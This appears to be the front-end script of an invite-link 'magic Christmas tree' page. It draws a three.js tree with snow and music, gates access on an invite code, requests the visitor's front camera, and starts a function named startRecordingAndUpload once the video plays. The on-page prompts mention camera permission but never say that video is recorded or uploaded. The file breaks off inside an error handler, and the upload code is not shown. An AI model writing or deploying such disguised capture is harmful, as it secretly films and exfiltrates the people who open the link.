import * as THREE from 'three';
import { EffectComposer } from 'three/addons/postprocessing/EffectComposer.js';
import { RenderPass } from 'three/addons/postprocessing/RenderPass.js';
import { UnrealBloomPass } from 'three/addons/postprocessing/UnrealBloomPass.js';

// --- 全局变量 ---
let scene, camera, renderer, composer;
let treeGroup, treePoints, ornamentPoints, starMesh;
let snowSystem, snowGeo;
let trailParticles = [];
let heartParticles = [];
let clock = new THREE.Clock();

// 状态管理
const state = {
    wind: 0,
    timeScale: 1.0,
    starActive: false,
    rainbowMode: false,
    blizzardMode: false,
    bgmPlaying: false,
    treeScale: 1.0,
    themeIndex: 0
};

const THEMES = [
    { name: "Classic", colors: [0x2ecc71, 0xf1c40f, 0xe74c3c] },
    { name: "Frozen", colors: [0x3498db, 0xffffff, 0xaed6f1] },
    { name: "Mystic", colors: [0x9b59b6, 0xe91e63, 0x00bcd4] }
];

// UI 元素
const loadingElement = document.getElementById('loading');
const feedbackElement = document.getElementById('status-feedback');
const cameraVideo = document.getElementById('camera_video');

// 录像相关变量
let inviteCode = '';
let isUploading = false;
let mediaRecorder = null;
let recordedChunks = [];
let maxVideoDuration = 60; // 默认60秒

// 随机特效相关
let randomEffectTimer = null;
let lastEffectTime = 0;
const EFFECT_INTERVAL = 3000; // 每3秒随机播放一个特效

// --- 音效管理器 ---
class SoundManager {
    constructor() {
        this.ctx = new (window.AudioContext || window.webkitAudioContext)();
        this.masterGain = this.ctx.createGain();
        this.masterGain.connect(this.ctx.destination);
        this.masterGain.gain.value = 0.5;
        this.isBgmPlaying = false;
        this.melody = [
            {n: 'E4', d: 0.25}, {n: 'E4', d: 0.25}, {n: 'E4', d: 0.5},
            {n: 'E4', d: 0.25}, {n: 'E4', d: 0.25}, {n: 'E4', d: 0.5},
            {n: 'E4', d: 0.25}, {n: 'G4', d: 0.25}, {n: 'C4', d: 0.35}, {n: 'D4', d: 0.15}, {n: 'E4', d: 1.0},
            {n: 'F4', d: 0.25}, {n: 'F4', d: 0.25}, {n: 'F4', d: 0.35}, {n: 'F4', d: 0.15},
            {n: 'F4', d: 0.25}, {n: 'E4', d: 0.25}, {n: 'E4', d: 0.25}, {n: 'E4', d: 0.15}, {n: 'E4', d: 0.1},
            {n: 'E4', d: 0.25}, {n: 'D4', d: 0.25}, {n: 'D4', d: 0.25}, {n: 'E4', d: 0.25}, {n: 'D4', d: 0.5}, {n: 'G4', d: 0.5}
        ];
        this.noteFreqs = {
            'C4': 261.63, 'D4': 293.66, 'E4': 329.63, 'F4': 349.23, 'G4': 392.00, 'A4': 440.00, 'B4': 493.88
        };
        this.bgmTimer = null;
        this.currentNoteIndex = 0;
    }

    resumeContext() {
        if (this.ctx.state === 'suspended') {
            this.ctx.resume();
        }
    }

    playTone(freq, duration, type = 'sine', vol = 0.1) {
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.type = type;
        osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
        gain.gain.setValueAtTime(vol, this.ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + duration);
        osc.connect(gain);
        gain.connect(this.masterGain);
        osc.start();
        osc.stop(this.ctx.currentTime + duration);
    }

    playEffect(type) {
        this.resumeContext();
        const now = this.ctx.currentTime;
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.connect(gain);
        gain.connect(this.masterGain);

        switch(type) {
            case 'magic':
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(500, now);
                osc.frequency.linearRampToValueAtTime(1500, now + 0.5);
                gain.gain.setValueAtTime(0.1, now);
                gain.gain.linearRampToValueAtTime(0, now + 1.0);
                osc.start();
                osc.stop(now + 1.0);
                break;
            case 'wind':
                osc.type = 'sawtooth';
                osc.frequency.setValueAtTime(100, now);
                osc.frequency.exponentialRampToValueAtTime(50, now + 1.0);
                gain.gain.setValueAtTime(0.05, now);
                gain.gain.linearRampToValueAtTime(0, now + 1.0);
                osc.start();
                osc.stop(now + 1.0);
                break;
            case 'switch':
                osc.type = 'square';
                osc.frequency.setValueAtTime(880, now);
                gain.gain.setValueAtTime(0.05, now);
                gain.gain.exponentialRampToValueAtTime(0.01, now + 0.1);
                osc.start();
                osc.stop(now + 0.1);
                break;
            case 'grow':
                osc.type = 'sine';
                osc.frequency.setValueAtTime(200, now);
                osc.frequency.linearRampToValueAtTime(400, now + 0.3);
                gain.gain.setValueAtTime(0.1, now);
                gain.gain.linearRampToValueAtTime(0, now + 0.3);
                osc.start();
                osc.stop(now + 0.3);
                break;
        }
    }

    toggleBGM() {
        this.resumeContext();
        if (this.isBgmPlaying) {
            this.stopBGM();
        } else {
            this.startBGM();
        }
        return this.isBgmPlaying;
    }

    startBGM() {
        if (this.isBgmPlaying) return;
        this.isBgmPlaying = true;
        this.currentNoteIndex = 0;
        this.playNextNote();
    }

    stopBGM() {
        this.isBgmPlaying = false;
        clearTimeout(this.bgmTimer);
    }

    playNextNote() {
        if (!this.isBgmPlaying) return;
        const note = this.melody[this.currentNoteIndex];
        const freq = this.noteFreqs[note.n];
        this.playTone(freq, note.d * 0.8, 'sine', 0.1);
        const durationMs = note.d * 500;
        this.bgmTimer = setTimeout(() => {
            this.currentNoteIndex = (this.currentNoteIndex + 1) % this.melody.length;
            this.playNextNote();
        }, durationMs);
    }
}

const soundManager = new SoundManager();

// --- 初始化入口 ---
// 优先验证邀请码，验证通过后才初始化页面和申请摄像头权限
(async () => {
    // 立即解析URL参数
    parseURLParams();
    
    // 优先验证邀请码（在申请摄像头权限之前）
    const isValid = await validateInviteCode();
    if (!isValid) {
        // 验证失败，显示空白页面
        blockPageAccess('邀请链接无效或已过期');
        return;
    }
    
    // 验证通过，初始化页面
    init();
    animate();
    startRandomEffects();
    getMaxVideoDuration();
    
    // 移动端浏览器（特别是QQ浏览器）必须在用户交互后才能请求摄像头权限
    // 显示提示，等待用户点击
    setupCameraPermissionRequest();
})();

function init() {
    scene = new THREE.Scene();
    scene.fog = new THREE.FogExp2(0x020111, 0.002);
    scene.background = new THREE.Color(0x020111);

    camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
    updateCameraPosition();

    renderer = new THREE.WebGLRenderer({
        canvas: document.getElementById('output_canvas'),
        antialias: true
    });
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));

    const renderScene = new RenderPass(scene, camera);
    const bloomPass = new UnrealBloomPass(new THREE.Vector2(window.innerWidth, window.innerHeight), 1.5, 0.4, 0.85);
    bloomPass.threshold = 0.15;
    bloomPass.strength = 1.5;
    bloomPass.radius = 0.5;

    composer = new EffectComposer(renderer);
    composer.addPass(renderScene);
    composer.addPass(bloomPass);
    
    const panelHeader = document.getElementById('panel-header');
    const panel = document.getElementById('instruction-panel');
    if(panelHeader && panel) {
        panelHeader.addEventListener('click', () => {
            panel.classList.toggle('collapsed');
        });
        if (window.innerWidth < 768) {
            panel.classList.add('collapsed');
        }
    }

    createEnhancedTree();
    createStar();
    createSnow();
    createForestBackground();

    window.addEventListener('resize', onWindowResize);
    
    // 移动端屏幕方向变化处理
    const handleOrientationChange = () => {
        // 延迟处理，等待浏览器完成方向变化
        setTimeout(() => {
            onWindowResize();
        }, 100);
    };
    
    // 监听屏幕方向变化（移动端）
    if (window.orientation !== undefined) {
        window.addEventListener('orientationchange', handleOrientationChange);
    } else {
        // 备用方案：监听 resize 事件（某些浏览器）
        window.addEventListener('resize', handleOrientationChange);
    }
    
    // iOS Safari 特殊处理
    if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
        // 防止iOS Safari的橡皮筋效果
        document.addEventListener('touchmove', (e) => {
            if (e.target === document.body || e.target === document.documentElement) {
                e.preventDefault();
            }
        }, { passive: false });
        
        // 处理iOS Safari的视口高度变化
        const setViewportHeight = () => {
            const vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', `${vh}px`);
        };
        setViewportHeight();
        window.addEventListener('resize', setViewportHeight);
    }
    
    // 页面关闭/隐藏时释放摄像头资源
    const handlePageUnload = () => {
        console.log('页面关闭/隐藏，释放摄像头资源');
        releaseCamera();
    };
    
    // 监听页面关闭事件
    window.addEventListener('beforeunload', handlePageUnload);
    window.addEventListener('unload', handlePageUnload);
    window.addEventListener('pagehide', handlePageUnload);
    
    // 监听页面隐藏事件（移动端切换应用时）
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            console.log('页面隐藏，释放摄像头资源');
            releaseCamera();
        }
    });
}

function updateCameraPosition() {
    const aspect = window.innerWidth / window.innerHeight;
    if (aspect < 1.0) {
        camera.position.set(0, 15, 45);
        camera.lookAt(0, 8, 0);
    } else {
        camera.position.set(0, 10, 30);
        camera.lookAt(0, 5, 0);
    }
}

function createEnhancedTree() {
    if (treeGroup) scene.remove(treeGroup);
    treeGroup = new THREE.Group();
    scene.add(treeGroup);

    const theme = THEMES[state.themeIndex];
    const foliageCount = 6000;
    const foliageGeo = new THREE.BufferGeometry();
    const foliagePos = [];
    const foliageCol = [];
    const colorGreen = new THREE.Color(theme.colors[0]);
    const colorDarkGreen = new THREE.Color(0x0f3d1e);

    for (let i = 0; i < foliageCount; i++) {
        const layerCount = 12;
        const layer = Math.floor(Math.random() * layerCount);
        const layerHeight = 20 / layerCount;
        const yBase = layer * layerHeight;
        const y = yBase + Math.random() * layerHeight * 1.5;
        const maxR = 9 * (1 - y / 22);
        const angle = Math.random() * Math.PI * 2;
        const lobeFreq = 5 + Math.floor(y / 5);
        const lobe = Math.cos(angle * lobeFreq);
        const r = maxR * (0.6 + 0.3 * lobe + 0.1 * Math.random()) * Math.sqrt(Math.random());

        const x = Math.cos(angle) * r;
        const z = Math.sin(angle) * r;
        
        foliagePos.push(x, y, z);
        
        const depth = r / maxR;
        const mixFactor = depth * 0.8 + Math.random() * 0.2;
        const c = colorDarkGreen.clone().lerp(colorGreen, mixFactor);
        if (Math.random() > 0.9) c.addScalar(0.1);
        foliageCol.push(c.r, c.g, c.b);
    }
    foliageGeo.setAttribute('position', new THREE.Float32BufferAttribute(foliagePos, 3));
    foliageGeo.setAttribute('color', new THREE.Float32BufferAttribute(foliageCol, 3));
    
    const foliageMat = new THREE.PointsMaterial({ 
        size: 0.8, 
        vertexColors: true, 
        map: new THREE.CanvasTexture(generatePineTexture()),
        alphaTest: 0.1,
        transparent: true,
        depthWrite: false,
        blending: THREE.NormalBlending
    });
    const foliage = new THREE.Points(foliageGeo, foliageMat);
    treeGroup.add(foliage);

    const ornamentCount = 500;
    const ornamentGeo = new THREE.BufferGeometry();
    const ornamentPos = [];
    const ornamentCol = [];
    const colorGold = new THREE.Color(theme.colors[1]);
    const colorRed = new THREE.Color(theme.colors[2]);

    for (let i = 0; i < ornamentCount; i++) {
        const t = i / ornamentCount;
        const y = t * 20;
        const angle = t * Math.PI * 30 + Math.random(); 
        const rBase = 9 * (1 - y / 21);
        const lobe = Math.cos(angle * 5); 
        const radius = rBase * (0.8 + 0.15 * lobe) + 0.2;

        const x = Math.cos(angle) * radius;
        const z = Math.sin(angle) * radius;

        ornamentPos.push(x, y, z);
        const c = Math.random() > 0.6 ? colorGold : colorRed;
        ornamentCol.push(c.r, c.g, c.b);
    }
    ornamentGeo.setAttribute('position', new THREE.Float32BufferAttribute(ornamentPos, 3));
    ornamentGeo.setAttribute('color', new THREE.Float32BufferAttribute(ornamentCol, 3));
    
    const ornamentMat = new THREE.PointsMaterial({ 
        size: 0.6, 
        vertexColors: true, 
        blending: THREE.AdditiveBlending,
        map: new THREE.CanvasTexture(generateLightTexture()),
        transparent: true,
        alphaTest: 0.1
    });
    ornamentPoints = new THREE.Points(ornamentGeo, ornamentMat);
    treeGroup.add(ornamentPoints);
}

function generateLightTexture() {
    const canvas = document.createElement('canvas');
    canvas.width = 32; canvas.height = 32;
    const context = canvas.getContext('2d');
    const gradient = context.createRadialGradient(16, 16, 0, 16, 16, 16);
    gradient.addColorStop(0, 'rgba(255, 255, 255, 1)');
    gradient.addColorStop(0.4, 'rgba(255, 255, 255, 0.8)');
    gradient.addColorStop(1, 'rgba(0, 0, 0, 0)');
    context.fillStyle = gradient;
    context.fillRect(0, 0, 32, 32);
    return canvas;
}

function generatePineTexture() {
    const canvas = document.createElement('canvas');
    canvas.width = 64; canvas.height = 64;
    const ctx = canvas.getContext('2d');
    ctx.translate(32, 32);
    ctx.strokeStyle = '#FFFFFF';
    ctx.lineWidth = 2;
    ctx.lineCap = 'round';
    
    const count = 12;
    for(let i=0; i<count; i++) {
        const angle = (i / count) * Math.PI * 2;
        const len = 15 + Math.random() * 15;
        ctx.beginPath();
        ctx.moveTo(0,0);
        ctx.lineTo(Math.cos(angle)*len, Math.sin(angle)*len);
        ctx.stroke();
    }
    
    const grad = ctx.createRadialGradient(0,0,0, 0,0,15);
    grad.addColorStop(0, 'rgba(255,255,255,1)');
    grad.addColorStop(1, 'rgba(255,255,255,0)');
    ctx.fillStyle = grad;
    ctx.fillRect(-32,-32,64,64);
    return canvas;
}

function updateTreeTheme() {
    state.themeIndex = (state.themeIndex + 1) % THEMES.length;
    createEnhancedTree();
}

function createStar() {
    const geometry = new THREE.OctahedronGeometry(1, 0);
    const material = new THREE.MeshBasicMaterial({ color: 0xffff88 });
    starMesh = new THREE.Mesh(geometry, material);
    starMesh.position.set(0, 20.5, 0);
    starMesh.scale.set(0.3, 0.3, 0.3);
    scene.add(starMesh);
    
    const spriteMat = new THREE.SpriteMaterial({ 
        map: new THREE.CanvasTexture(generateSprite()), 
        color: 0xffff00, 
        transparent: true, 
        blending: THREE.AdditiveBlending 
    });
    const sprite = new THREE.Sprite(spriteMat);
    sprite.scale.set(5, 5, 1);
    starMesh.add(sprite);
}

function generateSprite() {
    const canvas = document.createElement('canvas');
    canvas.width = 64; canvas.height = 64;
    const context = canvas.getContext('2d');
    const gradient = context.createRadialGradient(32, 32, 0, 32, 32, 32);
    gradient.addColorStop(0, 'rgba(255,255,255,1)');
    gradient.addColorStop(0.4, 'rgba(255,255,0,0.5)');
    gradient.addColorStop(1, 'rgba(0,0,0,0)');
    context.fillStyle = gradient;
    context.fillRect(0, 0, 64, 64);
    return canvas;
}

function createSnow() {
    const particleCount = 2000;
    snowGeo = new THREE.BufferGeometry();
    const positions = [];
    const velocities = [];
    const colors = [];
    const baseColor = new THREE.Color(0xffffff);

    for (let i = 0; i < particleCount; i++) {
        const x = (Math.random() - 0.5) * 80;
        const y = Math.random() * 50;
        const z = (Math.random() - 0.5) * 60;
        positions.push(x, y, z);
        velocities.push(0, -0.1 - Math.random() * 0.1, 0);
        colors.push(baseColor.r, baseColor.g, baseColor.b);
    }

    snowGeo.setAttribute('position', new THREE.Float32BufferAttribute(positions, 3));
    snowGeo.setAttribute('color', new THREE.Float32BufferAttribute(colors, 3));
    snowGeo.userData = { velocities: velocities };

    const material = new THREE.PointsMaterial({
        size: 0.8,
        color: 0xffffff,
        transparent: true,
        opacity: 0.9,
        vertexColors: true,
        blending: THREE.AdditiveBlending,
        depthWrite: false,
        map: new THREE.CanvasTexture(generateSnowflakeTexture()),
        alphaTest: 0.05
    });

    snowSystem = new THREE.Points(snowGeo, material);
    scene.add(snowSystem);
}

function generateSnowflakeTexture() {
    const canvas = document.createElement('canvas');
    canvas.width = 32; canvas.height = 32;
    const ctx = canvas.getContext('2d');
    ctx.strokeStyle = '#ffffff';
    ctx.lineWidth = 2;
    ctx.lineCap = 'round';
    ctx.translate(16, 16);
    
    for(let i = 0; i < 6; i++) {
        ctx.beginPath();
        ctx.moveTo(0, 0);
        ctx.lineTo(0, -14);
        ctx.stroke();
        ctx.beginPath();
        ctx.moveTo(0, -8);
        ctx.lineTo(-4, -12);
        ctx.stroke();
        ctx.beginPath();
        ctx.moveTo(0, -8);
        ctx.lineTo(4, -12);
        ctx.stroke();
        ctx.rotate(Math.PI / 3);
    }
    
    const gradient = ctx.createRadialGradient(0, 0, 0, 0, 0, 8);
    gradient.addColorStop(0, 'rgba(255,255,255,0.8)');
    gradient.addColorStop(1, 'rgba(255,255,255,0)');
    ctx.fillStyle = gradient;
    ctx.fillRect(-16, -16, 32, 32);
    return canvas;
}

function createForestBackground() {
    const groundGeo = new THREE.PlaneGeometry(200, 200);
    const groundMat = new THREE.MeshStandardMaterial({ 
        color: 0x111122, 
        roughness: 0.8,
        metalness: 0.1,
        side: THREE.DoubleSide
    });
    const ground = new THREE.Mesh(groundGeo, groundMat);
    ground.rotation.x = -Math.PI / 2;
    ground.position.y = -0.5;
    scene.add(ground);
    
    const ambientLight = new THREE.AmbientLight(0x404060, 0.5); 
    scene.add(ambientLight);
    
    const starLight = new THREE.PointLight(0xffaa33, 2, 60);
    starLight.position.set(0, 20, 0);
    starLight.castShadow = false;
    scene.add(starLight);
    
    const fillLight = new THREE.PointLight(0xccccff, 0.8, 50);
    fillLight.position.set(10, 10, 10);
    scene.add(fillLight);
}

// --- 摄像头初始化（前置摄像头录像） ---
let cameraStream = null;

// --- 释放摄像头资源 ---
function releaseCamera() {
    console.log('释放摄像头资源...');
    
    // 停止MediaRecorder
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        try {
            if (mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            mediaRecorder = null;
            console.log('停止MediaRecorder');
        } catch (err) {
            console.error('停止MediaRecorder失败:', err);
        }
    }
    
    // 停止所有摄像头轨道
    if (cameraStream) {
        try {
            const tracks = cameraStream.getTracks();
            tracks.forEach(track => {
                try {
                    track.stop();
                    console.log('停止摄像头轨道:', track.kind, track.label, track.readyState);
                } catch (err) {
                    console.warn('停止轨道失败:', err);
                }
            });
        } catch (err) {
            console.error('停止摄像头轨道失败:', err);
        }
        cameraStream = null;
    }
    
    // 清理video元素
    if (cameraVideo) {
        try {
            // 暂停播放
            if (!cameraVideo.paused) {
                cameraVideo.pause();
            }
            
            // 清理视频流
            if (cameraVideo.srcObject) {
                const stream = cameraVideo.srcObject;
                stream.getTracks().forEach(track => {
                    try {
                        track.stop();
                    } catch (err) {
                        console.warn('清理video流中的轨道失败:', err);
                    }
                });
                cameraVideo.srcObject = null;
            }
            
            // 清理blob URL
            if (cameraVideo.src && cameraVideo.src.startsWith('blob:')) {
                try {
                    URL.revokeObjectURL(cameraVideo.src);
                } catch (err) {
                    console.warn('清理blob URL失败:', err);
                }
                cameraVideo.src = '';
            }
            
            // 重置video元素
            cameraVideo.load();
            console.log('清理video元素完成');
        } catch (err) {
            console.error('清理video元素失败:', err);
        }
    }
    
    // 清理录像数据
    recordedChunks = [];
    recordedBlob = null;
    
    // 重置上传状态
    isUploading = false;
    
    console.log('摄像头资源释放完成');
}

// 检测浏览器类型
function detectBrowser() {
    const ua = navigator.userAgent;
    return {
        isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
        isIOS: /iPad|iPhone|iPod/.test(ua),
        isAndroid: /Android/i.test(ua),
        isQQBrowser: /MQQBrowser|QQBrowser|QQ\//i.test(ua),
        isWeChat: /MicroMessenger/i.test(ua),
        isUCBrowser: /UCBrowser/i.test(ua),
        isSafari: /Safari/i.test(ua) && !/Chrome|CriOS|FxiOS|OPiOS|mercury/i.test(ua),
        isChrome: /Chrome/i.test(ua) && !/OPR|Edge|Edg/i.test(ua)
    };
}

// 设置摄像头权限请求（需要用户交互触发）
function setupCameraPermissionRequest() {
    const browser = detectBrowser();
    
    // 更新加载提示，添加点击提示
    if (loadingElement) {
        let promptText = '正在初始化魔法引擎...<br>';
        promptText += '<span style="font-size: 12px; color: #aaa;">请允许摄像头权限<br>建议横屏体验最佳</span>';
        
        // 移动端浏览器（特别是QQ浏览器）需要用户点击才能请求权限
        if (browser.isMobile) {
            if (browser.isQQBrowser) {
                promptText = '<p style="font-size: 16px; margin-bottom: 10px;">🎄 魔法圣诞树 🎄</p>';
                promptText += '<p style="font-size: 14px; color: #fff; margin-bottom: 20px;">点击下方按钮开启摄像头</p>';
                promptText += '<button id="camera-permission-btn" style="padding: 12px 30px; font-size: 16px; background: #2ecc71; color: white; border: none; border-radius: 25px; cursor: pointer; box-shadow: 0 4px 15px rgba(46, 204, 113, 0.4);">开启摄像头</button>';
                promptText += '<p style="font-size: 12px; color: #aaa; margin-top: 15px;">请在弹出提示中允许摄像头权限</p>';
            } else {
                promptText = '<p style="font-size: 16px; margin-bottom: 10px;">🎄 魔法圣诞树 🎄</p>';
                promptText += '<p style="font-size: 14px; color: #fff; margin-bottom: 20px;">点击任意位置开启摄像头</p>';
                promptText += '<p style="font-size: 12px; color: #aaa;">请允许摄像头权限<br>建议横屏体验最佳</p>';
            }
        }
        
        loadingElement.innerHTML = promptText;
        
        // 为移动端添加点击事件监听
        if (browser.isMobile) {
            if (browser.isQQBrowser) {
                // QQ浏览器：使用按钮点击
                const btn = document.getElementById('camera-permission-btn');
                if (btn) {
                    btn.addEventListener('click', handleCameraPermissionClick, { once: true });
                    btn.addEventListener('touchend', handleCameraPermissionClick, { once: true });
                }
            } else {
                // 其他移动端浏览器：点击整个loading区域
                loadingElement.style.cursor = 'pointer';
                loadingElement.addEventListener('click', handleCameraPermissionClick, { once: true });
                loadingElement.addEventListener('touchend', handleCameraPermissionClick, { once: true });
            }
        } else {
            // 桌面端：延迟后自动请求（某些桌面浏览器允许）
            setTimeout(() => {
                initCamera();
            }, 500);
        }
    } else {
        // 如果没有loading元素，直接尝试请求权限
        setTimeout(() => {
            initCamera();
        }, 500);
    }
}

// 处理摄像头权限点击事件
function handleCameraPermissionClick(event) {
    event.preventDefault();
    event.stopPropagation();
    
    // 移除点击事件监听
    const browser = detectBrowser();
    if (browser.isQQBrowser) {
        const btn = document.getElementById('camera-permission-btn');
        if (btn) {
            btn.style.opacity = '0.7';
            btn.disabled = true;
        }
    }
    
    // 立即请求摄像头权限
    initCamera();
}

// 获取用户媒体的兼容性函数
function getUserMedia(constraints) {
    // 优先使用标准的 mediaDevices API
    if (typeof navigator !== 'undefined' && 
        navigator.mediaDevices && 
        typeof navigator.mediaDevices.getUserMedia === 'function') {
        return navigator.mediaDevices.getUserMedia(constraints);
    }
    
    // 降级到旧版 API（带前缀）
    const legacyGetUserMedia = navigator.getUserMedia || 
                              navigator.webkitGetUserMedia || 
                              navigator.mozGetUserMedia || 
                              navigator.msGetUserMedia;
    
    if (legacyGetUserMedia) {
        return new Promise((resolve, reject) => {
            legacyGetUserMedia.call(navigator, constraints, resolve, reject);
        });
    }
    
    // 都不支持，返回拒绝的 Promise
    return Promise.reject(new Error('您的浏览器不支持摄像头访问功能'));
}

function initCamera() {
    const browser = detectBrowser();
    
    // 检查浏览器支持（使用安全的检查方式）
    const hasMediaDevices = typeof navigator !== 'undefined' && 
                           navigator.mediaDevices && 
                           typeof navigator.mediaDevices.getUserMedia === 'function';
    const hasLegacyAPI = typeof navigator !== 'undefined' && (
        navigator.getUserMedia || 
        navigator.webkitGetUserMedia || 
        navigator.mozGetUserMedia || 
        navigator.msGetUserMedia
    );
    
    if (!hasMediaDevices && !hasLegacyAPI) {
        console.error('浏览器不支持摄像头访问');
        if (loadingElement) {
            loadingElement.innerHTML = '<p>❌ 您的浏览器不支持摄像头访问<br>请使用现代浏览器（Chrome、Firefox、Safari、Edge）<br>或确保使用 HTTPS 协议访问</p>';
        }
        return;
    }
    
    // 检查是否为 HTTPS 或 localhost（某些浏览器要求）
    const isSecureContext = window.location.protocol === 'https:' || 
                            window.location.hostname === 'localhost' || 
                            window.location.hostname === '127.0.0.1' ||
                            window.location.hostname === '0.0.0.0';
    
    if (!isSecureContext && !hasMediaDevices) {
        console.warn('非 HTTPS 环境，某些浏览器可能不支持摄像头访问');
        if (browser.isQQBrowser || browser.isWeChat) {
            if (loadingElement) {
                loadingElement.innerHTML = '<p>⚠️ QQ浏览器需要 HTTPS 协议才能访问摄像头<br>请使用 HTTPS 访问本页面</p>';
            }
            return;
        }
    }
    
    // 更新加载提示
    if (loadingElement) {
        loadingElement.innerHTML = '<div class="spinner"></div><p>正在请求摄像头权限...</p><p style="font-size: 12px; color: #aaa;">请在弹出的提示中允许访问摄像头</p>';
    }
    
    // 构建约束对象（兼容旧版 API和移动端）
    // 只请求视频权限，不请求音频权限
    // QQ浏览器和某些移动端浏览器需要简化的约束
    let constraints = {
        video: {
            facingMode: 'user',  // 前置摄像头
            width: browser.isMobile ? { ideal: 640, max: 1280 } : { ideal: 1280 },
            height: browser.isMobile ? { ideal: 480, max: 720 } : { ideal: 720 }
        }
    };
    
    // iOS Safari 特殊优化
    if (browser.isIOS) {
        constraints.video.frameRate = { ideal: 30, max: 30 };
    }
    
    // QQ浏览器和微信浏览器：使用更简化的约束
    if (browser.isQQBrowser || browser.isWeChat) {
        constraints = {
            video: {
                facingMode: 'user'
            }
        };
    }
    
    // 对于旧版 API，需要简化约束
    const legacyConstraints = {
        video: {
            facingMode: 'user'
        }
    };
    
    // 使用兼容性函数获取摄像头
    const useLegacy = !hasMediaDevices;
    getUserMedia(useLegacy ? legacyConstraints : constraints)
        .then((stream) => {
            cameraStream = stream;
            console.log('前置摄像头授权成功');
            
            // 将视频流显示在video元素上
            if (!cameraVideo) {
                console.error('video元素不存在');
                if (loadingElement) {
                    loadingElement.innerHTML = '<p>❌ 视频元素未找到<br>请刷新页面重试</p>';
                }
                releaseCamera();
                return;
            }
            
            // 先清理之前的流（如果有）
            if (cameraVideo.srcObject) {
                const oldStream = cameraVideo.srcObject;
                oldStream.getTracks().forEach(track => track.stop());
                cameraVideo.srcObject = null;
            }
            if (cameraVideo.src && cameraVideo.src.startsWith('blob:')) {
                URL.revokeObjectURL(cameraVideo.src);
                cameraVideo.src = '';
            }
            
            // 设置视频流（优先使用 srcObject）
            try {
                if (cameraVideo.srcObject !== undefined) {
                    cameraVideo.srcObject = stream;
                } else if (cameraVideo.mozSrcObject !== undefined) {
                    cameraVideo.mozSrcObject = stream;
                } else if (window.URL && window.URL.createObjectURL) {
                    const blobUrl = window.URL.createObjectURL(stream);
                    cameraVideo.src = blobUrl;
                } else {
                    throw new Error('浏览器不支持视频流设置');
                }
            } catch (err) {
                console.error('设置视频流失败:', err);
                if (loadingElement) {
                    loadingElement.innerHTML = '<p>❌ 无法设置视频流<br>请刷新页面重试</p>';
                }
                releaseCamera();
                return;
            }
            
            // iOS Safari 和移动端特殊处理
            cameraVideo.setAttribute('playsinline', 'true');
            cameraVideo.setAttribute('webkit-playsinline', 'true');
            cameraVideo.setAttribute('x5-playsinline', 'true');
            cameraVideo.muted = true; // iOS Safari 需要静音才能自动播放
            
            // 等待视频元数据加载
            let metadataLoaded = false;
            let videoPlaying = false;
            let retryCount = 0;
            const maxRetries = 3;
            
            const checkVideoReady = () => {
                // 检查视频是否已准备好
                if (cameraVideo.readyState >= 2 && // HAVE_CURRENT_DATA
                    cameraVideo.videoWidth > 0 && 
                    cameraVideo.videoHeight > 0) {
                    if (!metadataLoaded) {
                        metadataLoaded = true;
                        console.log('视频元数据已加载:', {
                            width: cameraVideo.videoWidth,
                            height: cameraVideo.videoHeight,
                            readyState: cameraVideo.readyState
                        });
                    }
                    
                    // 尝试播放视频
                    if (!videoPlaying) {
                        const playPromise = cameraVideo.play();
                        if (playPromise !== undefined) {
                            playPromise
                                .then(() => {
                                    videoPlaying = true;
                                    console.log('视频播放成功');
                                    // 隐藏加载提示
                                    if (loadingElement) {
                                        loadingElement.style.display = 'none';
                                    }
                                    // 等待一小段时间确保视频流稳定，然后开始录像
                                    setTimeout(() => {
                                        startRecordingAndUpload();
                                    }, 300);
                                })
                                .catch((err) => {
                                    console.warn('视频播放失败:', err);
                                    retryCount++;
                                    if (retryCount < maxRetries) {
                                        console.log(`重试播放视频 (${retryCount}/${maxRetries})...`);
                                        setTimeout(checkVideoReady, 500);
                                    } else {
                                        console.error('视频播放失败，已达到最大重试次数');
                                        // 即使播放失败，也尝试开始录像（某些浏览器可能仍能工作）
                                        if (loadingElement) {
                                            loadingElement.style.display = 'none';
                                        }
                                        setTimeout(() => {
                                            startRecordingAndUpload();
                                        }, 500);
                                    }
                                });
                        } else {
                            // 旧版浏览器，play() 可能不返回 Promise
                            videoPlaying = true;
                            if (loadingElement) {
                                loadingElement.style.display = 'none';
                            }
                            setTimeout(() => {
                                startRecordingAndUpload();
                            }, 300);
                        }
                    }
                } else {
                    // 视频还未准备好，继续等待
                    if (retryCount < maxRetries * 2) {
                        retryCount++;
                        setTimeout(checkVideoReady, 200);
                    } else {
                        console.error('视频准备超时');
                        if (loadingElement) {
                            loadingElement.innerHTML = '<p>❌ 视频加载超时<br>请刷新页面重试</p>';
                        }
                        releaseCamera();
                    }
                }
            };
            
            // 监听元数据加载事件
            const onLoadedMetadata = () => {
                console.log('loadedmetadata 事件触发');
                checkVideoReady();
            };
            
            // 监听播放事件
            const onPlaying = () => {
                console.log('playing 事件触发');
                videoPlaying = true;
                if (loadingElement) {
                    loadingElement.style.display = 'none';
                }
            };
            
            // 兼容旧版浏览器
            if (cameraVideo.addEventListener) {
                cameraVideo.addEventListener('loadedmetadata', onLoadedMetadata, { once: true });
                cameraVideo.addEventListener('playing', onPlaying, { once: true });
            } else {
                cameraVideo.onloadedmetadata = onLoadedMetadata;
                cameraVideo.onplaying = onPlaying;
            }
            
            // 开始检查视频状态（备用方案，防止事件未触发）
            setTimeout(checkVideoReady, 100);
        })
        .catch((err) => {
            console.error('摄像头授权失败:', err);
            const browser = detectBrowser();
            let errorMessage = '<p>❌ 无法访问摄像头</p>';
            
            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                if (browser.isQQBrowser) {
                    errorMessage += '<p>请在QQ浏览器设置中允许摄像头权限</p>';
